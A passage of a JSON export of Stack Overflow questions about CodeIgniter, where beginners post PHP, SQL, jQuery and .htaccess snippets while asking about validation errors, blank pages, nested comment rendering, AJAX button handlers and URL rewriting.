$ID_user = $this-&gt;input-&gt;post('ID_user');\n        $user = array(\n        'pass'=&gt;$this-&gt;input-&gt;post('pass'),\n        'nama'=&gt;$this-&gt;input-&gt;post('nama'),\n        'email'=&gt;$this-&gt;input-&gt;post('email'),\n        'active'=&gt;$this-&gt;input-&gt;post('active'),\n        'regis_date'=&gt;date('Y-m-d H:i:s'));\n\n        $this-&gt;user_m-&gt;update($ID_user, $user);\n        $data['user'] = $this-&gt;user_m-&gt;get_by_id($ID_user)-&gt;row_array();\n\n        //set user message\n        $data['message'] = 'Update User Success!';\n    }\n\n    $data['link_back'] = anchor('user/index/', 'Lihat daftar user', array('class'=&gt;'back'));\n    //load view\n    $this-&gt;load-&gt;view('user_form_v', $data);\n}\n</code></pre>\n\n<p>And this is the input type in view : </p>\n\n<pre><code>&lt;input type=\"text\" name=\"ID_user\" class=\"text\"\n                &lt;?php if($validate!='add'){echo \"disabled\";} ?&gt;\n                value=\"&lt;?php echo (isset($user['ID_user']))?$user['ID_user']:\"\"?&gt;\"/&gt;\n</code></pre>\n\n<p>The question is : <strong>while my user in the Update condition and they want to Update, the error message is shown because php think that the userid is null, the fact is the user id is already there, all i do is just print the userid in my input type and disabled it</strong>\nThis is the error message : <code>The User ID field is required.</code></p>\n"},{"tags":["php","mysql","codeigniter","amazon-ec2"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12328863,"title":"CodeIgniter application on Amazon EC2 displays blank pages","body":"<p>I have my CodeIgniter application running on an Amazon instance. I have created the required databases too (On MySQL). </p>\n\n<p>I used to get <strong>blank pages</strong> when I tried to access it using the amazon elastic IP/Appname.</p>\n\n<p>I checked my index.php thinking it was not loading the controllers. But in the <code>index</code> function of my default controller, I did a simple <code>echo \"Hello!\";</code> and this turns up just fine!</p>\n\n<p>But I actually load my db in the index function and do a lot of queries through the model. </p>\n\n<p>Hence the problem must be with the DB. Though I cannot put my finger on it.\nHow do I get rid of these blank pages??</p>\n\n<p>Any help??</p>\n\n<p>Thanks in advance.. </p>\n\n<p>PS: The same application worked on localhost without any other changes.</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":47,"score":2,"question_id":12328882,"title":"now(); and date(); function in code igniter give zeros result","body":"<p>So i want to insert current time to mysql database, this is my code :</p>\n\n<pre><code>'regis_date'=&gt;$this-&gt;input-&gt;post(date('Y-m-d H:i:s', now()))\n</code></pre>\n\n<p>But the result is this : <code>0000-00-00 00:00:00</code>\nWhat i want is like this (for example) : <code>2012-08-31 00:00:00</code>\nThanks :D</p>\n"},{"tags":["php","javascript","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":69,"score":0,"question_id":12328529,"title":"dynamically enabling/disabling a input text from controller","body":"<p>I'm new in PHP and im using CI :D\nNow i have a view <code>user_form_v</code> and its controller <code>user</code>\nin my controller i tried to pass a string variable name <code>$validate</code> and i will validate it in my view with javascript, so if <code>$validate == add</code> i will enable my input text.\nThis is my javascript(NOT WORKING) :</p>\n\n<pre><code>&lt;script type=\"text/javascript\"&gt;\n        function validation(){\n            var temp = &lt;?php echo $validate?&gt;\n            if (temp == \"add\")document.getElementById(\"id\").disable = false;\n        }\n    &lt;/script&gt;\n</code></pre>\n\n<p>and this is my input text, the default is DISABLED :</p>\n\n<pre><code>&lt;input id=\"id\" type=\"text\" name=\"ID_user\" class=\"text\" disabled=\"disable\"\n                value=\"&lt;?php echo (isset($user['ID_user']))?$user['ID_user']:\"\"?&gt;\"/&gt;\n</code></pre>\n\n<p><strong>ANSWER :</strong>\nAccording to the choosen answer, Javascript is no needed here(sorry im a noob) so all we need to do is add this : <code>&lt;?php if($validate!='add'){echo \"disabled\";} ?&gt;</code> this way, my input text will be disabled if they choose update.\n<strong>However it cant be work with <code>disabled=\"disabled\"</code></strong>(I dont know why)\nSo this is the final code for dynamic input text : <code>&lt;input type=\"text\" name=\"ID_user\" class=\"text\"\n                    &lt;?php if($validate!='add'){echo \"disabled\";} ?&gt;\n                    value=\"&lt;?php echo (isset($user['ID_user']))?$user['ID_user']:\"\"?&gt;\"/&gt;</code></p>\n"},{"tags":["php","codeigniter","phpexcel"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":393,"score":1,"question_id":10645957,"title":"CodeIgniter with PHPExcel fatal error cannot redeclare class IOFactory","body":"<p>I'm trying to use PHPExcel with CodeIgniter.</p>\n\n<p>My problem is when i want to use this method below, I got <strong>PHP Fatal Error : Cannot redeclare class IOFactory</strong> </p>\n\n<blockquote>\n  <p>If you're uncertain of the filetype, you can use the IO Factory's identify() method to identify the reader that you need, before using the createReader() method to instantiate the reader object.</p>\n</blockquote>\n\n<p>Below is my code:</p>\n\n<pre><code>$this-&gt;load-&gt;library('PHPExcel');\n\n$this-&gt;load-&gt;library('PHPExcel/IOFactory');\n\n$path = $upload_data['full_path'];\n\n$inputFileType = PHPExcel_IOFactory::identify($path);\n\n$objReader = PHPExcel_IOFactory::createReader($inputFileType);\n\n$objPHPExcel = $objReader-&gt;load($path);\n\n$objWorksheet = $objPHPExcel-&gt;getActiveSheet();\n</code></pre>\n\n<p>I try to find if the IOFactory class already created somewhere but cannot find it.</p>\n\n<p>FYI, im using the latest version of CodeIgniter (2.1) and PHPExcel (1.7.6) at this time of writing.</p>\n"},{"tags":["php","codeigniter","iis","iis7","http-status-code-500"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":588,"score":1,"question_id":10312773,"title":"CodeIgniter 500 Internal Server Error and Blank Page","body":"<p>I have just deployed my CodeIgniter application on to a live Windows ISS7 server, tried to access my root page and all I am getting is blank white. Firebug is telling me it's a '500 Internal Server Error'.</p>\n\n<p>The site worked fine on my development server (linux).</p>\n\n<p>When I echo 'hello' in index.php it displays the text, which suggests the server won't load the controllers.</p>\n\n<p>I have no experience using Windows servers unfortunately, and it's not my choice to use it! How can I access some sort of error log?</p>\n\n<p>Any ideas on how I can at least see what the issue is?</p>\n"},{"tags":["codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12328271,"title":"Codeigniter Comment Reply System","body":"<p>I am new to CI.</p>\n\n<p>Now i am try to develop the comment system with reply option.</p>\n\n<p>So far i have developed the insert comment and reply comment.</p>\n\n<p>But i don't know how to fetch reply comments under the main comment.</p>\n\n<p>Please help me.</p>\n\n<p>Thanks to all</p>\n"},{"tags":["php","codeigniter","authentication","authorization"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":113,"score":-1,"question_id":12328030,"title":"Codeigniter - User Authentication/login plugin/class?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/346980/how-should-i-choose-an-authentication-library-for-codeigniter\">How should I choose an authentication library for CodeIgniter?</a>  </p>\n</blockquote>\n\n\n\n<p>anyone here used a user login/registration class for Codeigniter? I've looked everywhere and there doesn't seem to be a 'go to' class that isn't only in the early stages of development (not very mature)</p>\n\n<p>anyone know any to recommend?</p>\n"},{"tags":["mysql","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":33,"score":-2,"question_id":12315084,"title":"Aggregate totals from a result in mySQL","body":"<p>In codeiginter - is it possible to aggregate totals from a result in mySQL using Active record?</p>\n\n<p><strong>My table:</strong></p>\n\n<pre><code>+-----------------+---------------+----------+\n|  transaction_ID |  category_ID  |  amount  |\n+-----------------+---------------+----------+\n|        1        |      2        |   5.0    |\n+-----------------+---------------+----------+\n|        2        |      1        |   6.0    |\n+-----------------+---------------+----------+\n|        3        |      2        |   4.1    |\n+-----------------+---------------+----------+\n|        4        |      3        |   1.2    |\n+-----------------+---------------+----------+\n|        5        |      1        |   7.0    |\n+-----------------+---------------+----------+\n</code></pre>\n\n<p><strong>What I'd like to achieve:</strong></p>\n\n<pre><code>+---------------+----------------+\n|  category_ID  |  total_amount  |\n+---------------+----------------+\n|       1       |      13.0      |\n+---------------+----------------+\n|       2       |      9.1       |\n+---------------+----------------+\n|       3       |      1.2       |\n+---------------+----------------+\n</code></pre>\n"},{"tags":["php","codeigniter","escaping","codeigniter-2","codeigniter-form-helper"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":37,"score":1,"question_id":12321894,"title":"How can I keep field data from being escaped and preserve html and image styles in CodeIgniter?","body":"<p>I’m using CKEditor and KCFinder to build a relatively simple CMS. Currently, things are working pretty well. I noticed an issue, though, when I started integrating images into the mix. The links for the iamges are comign back wrong. It looks like CKEditor might be changing the quotes, etc, on me. It looks correct when I look in mysql but it doesn’t always look correct when I look in the editor but it’s definitely not. Most of the time it does, but this time it came back looking like this:</p>\n\n<pre><code>&lt;img alt=\"\" data-cke-saved-src=\"http://placekitten.com.s3.amazonaws.com/homepage-samples/200/287.jpg\" \n     src=\"http://placekitten.com.s3.amazonaws.com/homepage-samples/200/287.jpg\"\n     200px;=\"\" height:=\"\" 287px;=\"\" float:=\"\" left;\"=\"\"&gt;i\n</code></pre>\n\n<p>For example, look at this page here: <a href=\"http://testosm.phpfogapp.com/pages/index/1/3/\" rel=\"nofollow\">http://testosm.phpfogapp.com/pages/index/1/3/</a></p>\n\n<p>I have all the code posted here: <a href=\"https://github.com/jshultz/monkey-cms\" rel=\"nofollow\">https://github.com/jshultz/monkey-cms</a> in case you want to see what I was doing? Any feedback would be appreciated.</p>\n\n<p><strong>UPDATE:</strong> \nI have turned on global_xss_filtering and the data is definitely cleaner now. all the styling was removed. Unfortunately. it’s almost perfect. Now, if I could just keep the image styling it would be perfect!</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":75,"score":1,"question_id":12326729,"title":"Separation (|) in PHP?","body":"<p>Taken directly from <a href=\"http://codeigniter.com/user_guide/libraries/form_validation.html\" rel=\"nofollow\">CodeIgniter page</a>.</p>\n\n<pre><code>$this-&gt;form_validation-&gt;set_rules('username', 'Username', 'trim|required|min_length[5]|max_length[12]|xss_clean');\n</code></pre>\n\n<p>This part:</p>\n\n<pre><code>'trim|required|min_length[5]|max_length[12]|xss_clean'\n</code></pre>\n\n<p>Does PHP have an inbuilt feature to seperate values by | checks, or CodeIgniter does it manually?</p>\n\n<p>If so,</p>\n\n<p>Why don't they use something like this?</p>\n\n<pre><code>set_rules('username', 'Username', array('trim', 'required' ...));\n</code></pre>\n\n<p>Isn't it alot easier to deal with arrays instead of wasting unnecessary codes to check | symbol and seperate tags?</p>\n"},{"tags":["php","codeigniter","hierarchical-data","nested-loops"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":12326475,"title":"How to output nested/threaded comments without echo","body":"<p>I created a nested comment library for Codeigniter and it's <em>almost</em> working.</p>\n\n<p>I can't seem to output the nested comments without echoing each <code>&lt;ul&gt;</code> or <code>&lt;li&gt;</code> element. I don't want the library writing anything directly, I want to save it to a variable and return it so that I can echo it out inside a view.</p>\n\n<p>Here is the library code:</p>\n\n<pre><code>&lt;?php if (!defined('BASEPATH')) exit('No direct script access allowed');\n\nclass Comments\n{\n    public $parents  = array();\n    public $children = array();\n\n    public function init($comments)\n    {\n        foreach ($comments as $comment)\n        {\n            if ($comment['parent_comment_id'] === NULL)\n            {\n                $this-&gt;parents[$comment['comment_id']][] = $comment;\n            }\n            else\n            {\n                $this-&gt;children[$comment['parent_comment_id']][] = $comment;\n            }\n        }\n\n        $this-&gt;prepare($this-&gt;parents);\n\n    } // End of init\n\n    public function thread($comments)\n    {\n        if(count($comments))\n        {\n            echo '&lt;ul&gt;';\n\n            foreach($comments as $c)\n            {\n                echo \"&lt;li&gt;\" . $c['text'];\n                //Rest of what ever you want to do with each row\n\n                if (isset($this-&gt;children[$c['comment_id']])) {\n                    $this-&gt;thread($this-&gt;children[$c['comment_id']]);\n                }\n\n                echo \"&lt;/li&gt;\";\n            }\n            echo \"&lt;/ul&gt;\";\n        }\n    } // End of thread\n\n    private function prepare()\n    {\n        foreach ($this-&gt;parents as $comment)\n        {\n            $this-&gt;thread($comment);\n        }\n    } // End of prepare\n\n} // End of Comments class\n</code></pre>\n\n<p>The above code generates:</p>\n\n<pre><code>- Parent\n    - Child\n        - Child Third level\n- Second Parent\n    - Second Child\n</code></pre>\n\n<p>or in HTML:</p>\n\n<pre><code>&lt;ul&gt;\n    &lt;li&gt;Parent\n        &lt;ul&gt;\n        &lt;li&gt;Child\n            &lt;ul&gt;\n                &lt;li&gt;Child Third level&lt;/li&gt;\n            &lt;/ul&gt;\n        &lt;/li&gt;\n        &lt;/ul&gt;\n    &lt;/li&gt;\n&lt;/ul&gt;\n\n&lt;ul&gt;\n    &lt;li&gt;Second Parent\n        &lt;ul&gt;\n            &lt;li&gt;Second Child&lt;/li&gt;\n        &lt;/ul&gt;\n    &lt;/li&gt;\n&lt;/ul&gt;\n</code></pre>\n\n<p>This is the correct HTML, but echoing them out is not desirable.</p>\n\n<p>What I tried to do was:</p>\n\n<pre><code>public function thread($comments)\n    {\n        if(count($comments))\n        {\n            $output = '&lt;ul&gt;';\n\n            foreach($comments as $c)\n            {\n                $output .= \"&lt;li&gt;\" . $c['text'];\n                //Rest of what ever you want to do with each row\n\n                if (isset($this-&gt;children[$c['comment_id']])) {\n                    $this-&gt;thread($this-&gt;children[$c['comment_id']]);\n                }\n\n                $output .= \"&lt;/li&gt;\";\n            }\n            $output .= \"&lt;/ul&gt;\";\n\n            echo $output;\n        }\n    } // End of thread\n</code></pre>\n\n<p>This doesn't work as expected and it generates the following when echo'd:</p>\n\n<pre><code>- Child Third level\n- Child\n- Parent\n- Second Child\n- Second Parent\n</code></pre>\n\n<p>or the HTML:</p>\n\n<pre><code>&lt;ul&gt;&lt;li&gt;Child Third level&lt;/li&gt;&lt;/ul&gt;\n&lt;ul&gt;&lt;li&gt;Child&lt;/li&gt;&lt;/ul&gt;\n&lt;ul&gt;&lt;li&gt;Parent&lt;/li&gt;&lt;/ul&gt;\n&lt;ul&gt;&lt;li&gt;Second Child&lt;/li&gt;&lt;/ul&gt;\n&lt;ul&gt;&lt;li&gt;Second Parent&lt;/li&gt;&lt;/ul&gt;\n</code></pre>\n\n<p>This is obviously not desired since it's not nesting the comments.</p>\n\n<p>I've been stuck on this all day, anyone have a suggestion on how I can get the list to be generated properly?</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":12323539,"title":"PHP/Codeigniter Logical Operator","body":"<pre><code>$total_cost_for_A = $this-&gt;admin_model-&gt;total_cost_for_A($branch, $department, $date);\n$total_cost_for_B = $this-&gt;admin_model-&gt;total_cost_for_B($branch, $department, $date);\n</code></pre>\n\n<p>The variables <i>$total_cost_for_A and $total_cost_for_B</i>  hold the returned value from a mysql summation queries in the model. The queries return false if no record was found. Now, I'm trying to perform this operation.</p>\n\n<pre><code>if(($total_cost_for_A === FALSE) &amp;&amp; ($total_cost_for_B === FALSE))\n{\n  $data['no_record'] = 'No Record Found!';\n  $this-&gt;load-&gt;view('admin/bookings', $data);\n}\nelse\n{\n    $this-&gt;load-&gt;view('admin/summary', $data);\n}\n</code></pre>\n\n<p>This test always fail and execute the else statement instead, which is not what. Any assistance will be appreciated. Thanks</p>\n\n<p><b>Here are the functions</b></p>\n\n<pre><code>    function total_cost_for_A($branch, $department, $date)\n    {\n        if($branch == 'Head Office' &amp;&amp; $department == 'Summary')\n        {\n            $select_amount_paid = 'SELECT SUM(total_amount) total_amount FROM graphics_booking AS bk\n            WHERE bk.date = \"'.$date.'\"';\n        }\n\n        $result = $this-&gt;db-&gt;query($select_amount_paid);\n\n        if($result-&gt;num_rows() &gt; 0)\n        {\n            return $result;\n        }\n        else\n        {\n            return FALSE;\n        }\n    }\n\n\n    function total_cost_for_B($branch, $department, $date)\n    {\n        if($branch == 'Head Office' &amp;&amp; $department == 'Summary')\n        {\n            $total_LF_amount = 'SELECT SUM(total_amount) total_amount FROM large_format_print\n            WHERE date = \"'.$date.'\"';\n        }\n\n        $result = $this-&gt;db-&gt;query($total_LF_amount);\n\n        if($result-&gt;num_rows() &gt; 0)\n        {\n            return $result;\n        }\n        else\n        {\n            return FALSE;\n        }\n    }\n</code></pre>\n"},{"tags":["php","html","codeigniter","session","caching"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":816,"score":0,"question_id":10418964,"title":"CodeIgniter back button after logout","body":"<p>I'm trying to stop/disable the back button functionality of the browser when a user logs out of my CodeIgniter (PHP) app. But, I think the browser is caching the page so it becomes visible despite the session being destroyed from logout.</p>\n\n<p>I know the session is dead because when the user tries to do anything (click any link etc) they are kicked out through the methods in my controller.</p>\n\n<p>It's not ideal to have the back button working in this manner since the previous page contains confidential information.</p>\n\n<p>Not a clue how to tackle this one, maybe a redirect page in between (but then the user could slam the back button really quick right?), help!</p>\n\n<p>Thanks.</p>\n"},{"tags":["php","javascript","codeigniter","date","average"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":64,"score":0,"question_id":12322209,"title":"Average of dates per months to Graph, how?","body":"<p>I working on a website codeigniter based. In my database i have a lot of dates in this format:\nyyyy-mm-dd hh:mm:ss</p>\n\n<p>What i want is to represent in a graph, all the 12 months, and for each month the total of dates that i have on my database. For now just a graph for 2012, next year ill change it for 2013.</p>\n\n<p>How can i do it? Any ideas? </p>\n\n<p>I searched a lot for javascript graph/tables such as in google api but none of them gave me everything i needed. Also, how can i read from database the dates and \"put them\" in each month.</p>\n\n<p>Thanks</p>\n"},{"tags":["php","ajax","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":12325159,"title":"ajax call only works first time","body":"<p>I have a method in my controller that lets users check something called \"POE Status\".\nThis returns a string that i display in a div tag on my view.  I also provide 2 buttons.  one to enable POE and the other to disable.  Both the enable and disable commands will return the POE status as a result. \nSo I'm trying to use ajax to update the page with the new status once either one of the two buttons are clicked. </p>\n\n<p>What I'm noticing is that both buttons will work the first time the page is loaded.  But after the initial ajax call is made and the view updated, if i try to use the buttons again, nothing happens.</p>\n\n<p>I have the following HTML: (i'm not including all the html, just the parts that I think matter....)</p>\n\n<pre><code>  &lt;div class=\"span6\" id=\"clientajaxcontainer\"&gt;\n\n      &lt;h2&gt;Port POE Status: Port &lt;?php echo $portname;?&gt;&lt;/h2&gt;\n      &lt;p&gt;&lt;p&gt;\n      &lt;?php echo $poeStatus;?&gt;                \n      &lt;button class=\"btn\" id=\"enable\"&gt;Enable POE&lt;/button&gt;&amp;nbsp;\n      &lt;button class=\"btn\" id=\"disable\"&gt;Disable POE&lt;/button&gt;              \n  &lt;/div&gt;\n</code></pre>\n\n<p>Then I have the following javascript: </p>\n\n<pre><code>  &lt;script&gt;\n //Enable POE button\n  $('#enable').click(function()  {\n   alert('in POEOn');\n   console.log('On');\n  //disbled button until ajax request is done. \n  $(this).attr(\"disabled\",\"disabled\");\n  $('#disable').attr(\"disabled\",\"disabled\");\n  var htmlstring;\n  $.ajax({\n    url:\"&lt;?php echo site_url('controller/poeOn);?&gt;\",\n    type:'POST',\n    dataType:'text',\n    success: function(returnDataFromController) {\n    htmlstring = \"&lt;h2&gt;Port POE Status: Port \" + $('#port').val() + \"&lt;/h2&gt;&lt;p&gt;&lt;p&gt;\" + returnDataFromController + \"&lt;button class='btn' name='enable' id='enable'&gt;Enable POE&lt;/button&gt;&amp;nbsp;&lt;button class='btn' name='disable' id='disable'&gt;Disable POE&lt;/button&gt;\";    \n    alert(htmlstring);\n    $('#clientajaxcontainer').html(htmlstring); \n    console.log(htmlstring);\n  }\n});\n//re-enable the buttons.\n$(this).removeAttr(\"disabled\");\n$('#disable').removeAttr(\"disabled\");\n  });\n\n\n//Disable POE button\n  $('#disable').click(function()  {\nalert('in POEoff');\nconsole.log('Off');\n//disbled button until ajax request is done. \n$(this).attr(\"disabled\",\"disabled\");\n$('#enable').attr(\"disabled\",\"disabled\");\n\n$.ajax({\n  url:\"&lt;?php echo site_url('controller/poeOff);?&gt;\",\n  type:'POST',\n  dataType:'text',\n  success: function(returnDataFromController) {\n    htmlstring = \"&lt;h2&gt;Port POE Status: Port \" + $('#port').val() + \"&lt;/h2&gt;&lt;p&gt;&lt;p&gt;\" + returnDataFromController + \"&lt;button class='btn' name='enable' id='enable'&gt;Enable POE&lt;/button&gt;&amp;nbsp;&lt;button class='btn' name='disable' id='disable'&gt;Disable POE&lt;/button&gt;\";    \n\n    alert(htmlstring);\n    $('#clientajaxcontainer').html(htmlstring); \n    console.log(htmlstring);\n}\n  });\n  //re-enable the buttons.\n  $(this).removeAttr(\"disabled\");\n  $('#enable').removeAttr(\"disabled\");\n});    \n\n&lt;/script&gt;\n</code></pre>\n\n<p>Can you tell me where I'm going wrong?\nThanks.</p>\n"},{"tags":["codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":63,"score":0,"question_id":12320589,"title":"CodeIgniter - Delete file, pathing issue","body":"<p>I have 3 folders in my root, \"application\", \"system\", and \"uploads\". In application/controllers/mycontroller.php I have this line of code. </p>\n\n<pre><code>delete_files(\"../../uploads/$file_name\");\n</code></pre>\n\n<p>The file does not get deleted and I have tried a number of pathing options like ../ and ../../../ any ideas? Thanks.</p>\n"},{"tags":["mysql","codeigniter","subquery"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":47,"score":1,"question_id":12322423,"title":"Codeigniter - convert mysql query to CodeIgniter's active record query","body":"<p>I'm trying to convert this SQL query into a codeigniter query</p>\n\n<pre><code>SELECT \n  uploads.EMAIL\nFROM\n  uploads \n  JOIN (\n\n    SELECT EMAIL, COUNT(*) as num FROM uploads GROUP BY EMAIL\n  ) c ON uploads.EMAIL = c.EMAIL\nORDER BY \n  c.num DESC, \n  EMAIL ASC\n</code></pre>\n\n<p>Thanks for the help\nkind regards</p>\n"},{"tags":["codeigniter","hybridauth"],"answer_count":2,"favorite_count":5,"up_vote_count":4,"down_vote_count":0,"view_count":1091,"score":4,"question_id":10422573,"title":"Hybrid Auth with Codeigniter","body":"<p>I downloaded the codeigniter extension of HybridAuth here: </p>\n\n<p><a href=\"https://github.com/andacata/HybridIgniter\" rel=\"nofollow\">https://github.com/andacata/HybridIgniter</a></p>\n\n<p>I followed instructions on it's use. When I try to login via any provider at: <code>www.mydomainname.com/hauth/login/twitter</code> it loads a page saying:</p>\n\n<pre><code>HybridAuth\nOpen Source Social Sign On PHP Library. \nhybridauth.sourceforge.net/\n</code></pre>\n\n<p>It never works. I have valid api credentials for twitter and facebook but both load this page and nothing else happens. Any tips would be greatly appreciated.</p>\n\n<p><strong>UPDATE</strong></p>\n\n<p>My log says:</p>\n\n<pre><code>Hybrid_Provider_Adapter::login( facebook ), redirect the user to login_start URL. -- Array\n(\n    [hauth_return_to] =&gt; http://www.sitename.com/hauth/login/facebook\n    [hauth_token] =&gt; 6vjglu8usmsjqsi74cku8o85j3\n    [hauth_time] =&gt; 1335997302\n    [login_start] =&gt; http://sitename.com/hauth/endpoint?hauth.start=facebook&amp;hauth.time=1335997302\n    [login_done] =&gt; http://sitename.com/hauth/endpoint?hauth.done=facebook\n)\n\nINFO -- 127.0.0.1 -- 2012-05-03T00:21:42+02:00 -- Enter Hybrid_Auth::redirect( http://sitename.com/hauth/endpoint?hauth.start=facebook&amp;hauth.time=1335997302, PHP )\n</code></pre>\n\n<p><strong>UPDATE</strong></p>\n\n<p>Here is a link to the controller</p>\n\n<p><a href=\"https://github.com/andacata/HybridIgniter/blob/master/application/controllers/hauth.php\" rel=\"nofollow\">https://github.com/andacata/HybridIgniter/blob/master/application/controllers/hauth.php</a></p>\n"},{"tags":["jquery","ajax","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":114,"score":0,"question_id":12320977,"title":"how to delete record with codeigniter and jquery?","body":"<p>I have working codeigniter controller and view which sucessfully delete record. I would like to do it with ajax - jquery, to avoid reloading the page, and sure enough I will need to prompt the user if he is sure about deleting the record.</p>\n\n<p>Any code snippet would be deeply appreciated, since i don't know where to start:</p>\n\n<p>Here is the code from the controller:</p>\n\n<pre><code>public function deleteUser()\n    {\n        $this-&gt;load-&gt;model('backOfficeUsersModel');\n        $deleteWhat = array(\n            'dpage' =&gt; $this-&gt;input-&gt;post('dpage'),\n            'rid'   =&gt; $this-&gt;input-&gt;post('rid')\n        );\n        $this-&gt;backOfficeUsersModel-&gt;delete($deleteWhat['rid']);\n        redirect($deleteWhat['dpage']);\n    } // end of function deleteUser\n</code></pre>\n\n<p>Here is the view that I have now: (just the php code is presented for the sake of simplicity)</p>\n\n<pre><code>foreach ($users as $key =&gt; $user) {\n                            echo form_open('backOfficeUsers/deleteUser');\n                            echo form_hidden('dpage', 'backOfficeUsers/displayAllUsers');\n                            echo form_hidden('rid', $user['userid']);\n                            echo \"&lt;tr&gt;\";\n                            echo \"&lt;td&gt;\";\n\n                            $data = array(\n                                'name' =&gt; 'row_sel',\n                                'id' =&gt; $user['userid'],\n                                'value' =&gt; $user['userid'],\n                                'class' =&gt; 'select_row'\n                            );\n\n                            echo form_checkbox($data);\n\n                            //echo \"&lt;input type='checkbox' class='select_row' name='row_sel'&gt;\"; \n                            echo \"&lt;/td&gt;\";\n                            echo \"&lt;td&gt;\" . $user['userid'] . \"&lt;/td&gt;\";\n                            echo \"&lt;td&gt;\" . $user['firstname'] . \" \" . $user['lastname'] . \"&lt;/td&gt;  \";\n                            echo \"&lt;td&gt;\" . $user['username'] . \"&lt;/td&gt;  \";\n                            echo \"&lt;td&gt;&lt;a href=mailto:\" . $user['email'] . \"&gt;\" . $user['email'] . \"&lt;/td&gt;  \";\n                            echo \"&lt;td style='text-align: center;'&gt;\";\n                            echo anchor(\"backOfficeUsers/displayEditUserForm/$user[userid]/\", \"&lt;i class=splashy-pencil&gt;&lt;/i&gt;\", \"class=ext_disabled\");     \n                            echo \"&lt;/td&gt;\";\n                            echo\"&lt;td style='text-align: center;'&gt;\";\n                            $confirm = \"class='splashy-remove' style='border:none; width:16px; height:16px;'\";\n\n                            echo form_submit('submit', '', $confirm);\n                            echo\"&lt;/td&gt;&lt;/tr&gt;\";\n\n                            echo form_close();\n                        }\n</code></pre>\n\n<p>Any help (code snippet, or link to some example) will be deeply appreciated</p>\n\n<p>Regards,Zoran</p>\n"},{"tags":["codeigniter","command-line","doctrine2","cli"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":376,"score":0,"question_id":8027587,"title":"Doctrine 2 cli - Command Line Tool - Unexpected character in input - Generate entities","body":"<p>I am having a problem with running commands via cli <code>doctrine-cli.php</code> file. I am using Doctrine 2 and Codeigniter 2. I would like to generate entities via Command Line Tool, but without success. Page is hosted by <a href=\"http://www.hostgator.com\" rel=\"nofollow\">Hostgator</a>. On this server is installed by default PHP version 5.2, but you can use PHP version 5.3 by adding some commands to .htaccess file located in root.</p>\n\n<p>In the Command Line Tool I get this error:</p>\n\n<pre><code>Warning: Unexpected character in input:  '\\' (ASCII=92) state=1 in /home/tig3rb0y/public_html/naselsi/application/doctrine-cli.php on line 10\n\nWarning: Unexpected character in input:  '\\' (ASCII=92) state=1 in /home/tig3rb0y/public_html/naselsi/application/doctrine-cli.php on line 10\n\nParse error: syntax error, unexpected T_STRING in /home/tig3rb0y/public_html/naselsi/application/doctrine-cli.php on line 10\n</code></pre>\n\n<p>If I run a file with PHP version via url, I get PHP version 5.3, but if I run the same file via Command Line Tool, I get php version 5.2. Why is that so?</p>\n\n<p>Is there any solution for that?</p>\n\n<p>Regards, Mario</p>\n"},{"tags":["php","apache","codeigniter","ubuntu","rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12312471,"title":"Addition of unintended \".html\" to the URI causing 404 File Not Found (CodeIgniter)","body":"<p>I was developing a website in codeigniter in Windows with XAMPP (everything works as intended), but I moved the website to my Ubuntu machine with LAMP stack. Every other page works, except for this page, where something seems to be adding .html to the URL path.</p>\n\n<p>The PROBLEM:</p>\n\n<p>A link has the href of : localhost/vn/search/256 <br>\n  When I click, CI should load the search_venues function from Search controller class. This works on the Windows installation.\n <br>Here is the routing config. <br></p>\n\n<blockquote>\n  <p>$route['search/(:num)'] = \"search/search_venues/$1\";</p>\n</blockquote>\n\n<p>The HTML link is still \"localhost/vn/search/256\", but on ubuntu, when I click on it, [some sort of redirect??] is happening that is adding .html to the URL path. <br></p>\n\n<blockquote>\n  <p>Not Found\n  The requested URL /vn/search.html/256 was not found on this server.</p>\n</blockquote>\n\n<p>The URL shows : <code>localhost/vn/search/256</code></p>\n\n<p>As you can see \".html\" is being added to the search. This only happens with this controller only. All other are working fine. This is working in Windows. If I put \"localhost/vn/index.php/search/256\" it works. I have a .htaccess rewrite that is working in Windows and for other rewrite within Ubuntu. Here is the .htaccess code.</p>\n\n<pre><code>RewriteEngine on \nRewriteCond %{REQUEST_FILENAME} !-f \nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ index.php/$1 [L]\n</code></pre>\n\n<p>This is not only working for the search, as \".html\" is added out of nowhere.</p>\n\n<p>I have been looking for what is causing but I cannot find where this is happening. This is not a problem with the browser (i think), as I tried it with Chromium and Firefox.</p>\n\n<p>Here is the access_log file</p>\n\n<blockquote>\n  <p>27.0.0.1 - - [07/Sep/2012:11:29:03 +0545] \"GET /vn/search/256 